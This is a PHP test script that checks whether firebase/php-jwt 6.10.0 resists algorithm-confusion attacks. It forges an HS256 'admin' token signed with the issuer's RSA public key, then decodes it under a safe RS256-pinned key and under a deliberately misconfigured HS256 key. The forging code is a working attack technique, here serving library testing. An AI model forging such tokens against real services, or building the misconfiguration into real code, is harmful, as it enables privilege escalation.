<?php
// Cross-language — PHP firebase/php-jwt v6 algorithm confusion (RS256->HS256).
// DY limit: attacker knows only the issuer's RSA PUBLIC key; forges an HS256
// role=admin token using the public key PEM as the HMAC secret.
require __DIR__.'/src/JWTExceptionWithPayloadInterface.php';
require __DIR__.'/src/SignatureInvalidException.php';
require __DIR__.'/src/BeforeValidException.php';
require __DIR__.'/src/ExpiredException.php';
require __DIR__.'/src/Key.php';
require __DIR__.'/src/JWT.php';
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

$res = openssl_pkey_new(['private_key_bits'=>2048,'private_key_type'=>OPENSSL_KEYTYPE_RSA]);
$details = openssl_pkey_get_details($res);
$pubPem = $details['key'];                       // public (attacker has it)

function b64url($s){ return rtrim(strtr(base64_encode($s), '+/', '-_'), '='); }

// forged HS256 token, HMAC secret = public-key PEM, role=admin
$header  = b64url(json_encode(['alg'=>'HS256','typ'=>'JWT']));
$payload = b64url(json_encode(['role'=>'admin','iss'=>'real-issuer']));
$sig     = b64url(hash_hmac('sha256', "$header.$payload", $pubPem, true));
$forged  = "$header.$payload.$sig";

echo str_repeat('=',70)."\n";
echo "firebase/php-jwt 6.10.0 — algorithm confusion (RS256->HS256)\n";
echo str_repeat('=',70)."\n";

$tp = 0;

// (1) SAFE: verifier pins RS256 with the public key
try {
    JWT::decode($forged, new Key($pubPem, 'RS256'));
    echo "  [A]  decode Key(pub,'RS256') (safe)      ACCEPT\n";
} catch (\Throwable $e) {
    echo "  [OK] decode Key(pub,'RS256') (safe)      REJECT ".substr(get_class($e),strrpos(get_class($e),'\\')+1)."\n";
}

// (2) MISUSE: app declares the public key an HS256 key (extreme misconfig)
try {
    $d = JWT::decode($forged, new Key($pubPem, 'HS256'));
    $admin = isset($d->role) && $d->role === 'admin';
    if ($admin) $tp = 1;
    echo "  [".($admin?'A':'?')."]  decode Key(pub,'HS256') (misuse)    ACCEPT role=".($d->role ?? '-')."\n";
} catch (\Throwable $e) {
    echo "  [OK] decode Key(pub,'HS256') (misuse)    REJECT ".substr(get_class($e),strrpos(get_class($e),'\\')+1)."\n";
}

echo str_repeat('-',70)."\n";
echo "RESULT\tfirebase/php-jwt 6.10.0\tconfusion_TP=$tp\tnote=alg-pinned-per-Key\n";
